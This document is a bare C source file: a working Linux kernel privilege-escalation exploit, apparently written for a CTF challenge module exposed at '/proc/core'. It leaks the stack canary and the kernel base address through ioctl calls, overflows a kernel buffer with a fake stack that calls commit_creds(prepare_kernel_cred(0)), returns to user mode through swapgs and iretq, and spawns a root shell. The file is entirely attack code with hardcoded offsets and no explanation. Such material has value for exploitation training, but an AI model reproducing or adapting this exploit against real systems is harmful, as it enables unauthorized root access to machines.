#include<stdlib.h>
#include<stdio.h>
#include<unistd.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<string.h>
#include<stdint.h>

unsigned long user_cs, user_ss,user_eflags,user_sp;
void save_stats()
{
	asm volatile(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"movq %%rsp, %3\n"
	"pushfq \n"
	"popq %2\n"
	:"=r"(user_cs),"=r"(user_ss),"=r"(user_eflags),"=r"(user_sp)
	:
	);
}

void get_shell(void)
{
	system("/bin/sh\0");
}

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL;
void (*commit_creds)(void*) KERNCALL;
void payload()
{
	commit_creds(prepare_kernel_cred(0));
}

void setoff(int fd, unsigned long long off)
{
	ioctl(fd,0x6677889C,off);
}
void core_read(int fd, char *buf)
{	
	ioctl(fd,0x6677889B,buf);
}
void core_copy_func(int fd, unsigned long long off)
{
	ioctl(fd,0x6677889A,off);
}
int main()
{
	save_stats();
	unsigned long long buf[0x40/8];
	memset(buf,0,0x40);
	unsigned long long canary;
	unsigned long long module_base;
	unsigned long long vmlinux_base;
	//unsigned long long commit_creds;
	//unsigned long long prepare_kernel_cred;
	unsigned long long iretq;
	unsigned long long swapgs;
	unsigned long long fake_stack[0x30];
	memset(fake_stack,0,0x30*8);
	int fd = open("/proc/core",O_RDWR);
	if(fd == -1)
	{
		printf("can't open file\n");
		exit(0);
	}
	else{
		printf("open successfully\n");
	}
	
	setoff(fd,0x40);
	core_read(fd,buf);	
	printf("[*] canary:%llx\n",buf[0]);
	canary = buf[0];
	module_base = buf[2]-0x19b;
	vmlinux_base = buf[4]-0x1dd6d1;
	//vmlinux_base = buf[4] - 0x16684f0;
	printf("[*] vmlinux_base: 0x%p",vmlinux_base);
	swapgs = module_base + 0xd6; 
	commit_creds = vmlinux_base + 0x9c8e0;
	prepare_kernel_cred = vmlinux_base + 0x9cce0;
	iretq = vmlinux_base + 0x50ac2;
	
	fake_stack[8] = canary;
	fake_stack[10] = payload;
	fake_stack[11] = swapgs;
	fake_stack[12] = 0xdeadbeef;
	fake_stack[13] = iretq;	
	fake_stack[14] = get_shell;
	fake_stack[15] = user_cs;
	fake_stack[16] = user_eflags;
	fake_stack[17] = user_sp;
	fake_stack[18] = user_ss;
	fake_stack[19] = 0;
	write(fd,fake_stack,0x30*8);
	core_copy_func(fd,0xf000000000000000+0x30*8);
	return 0;
}
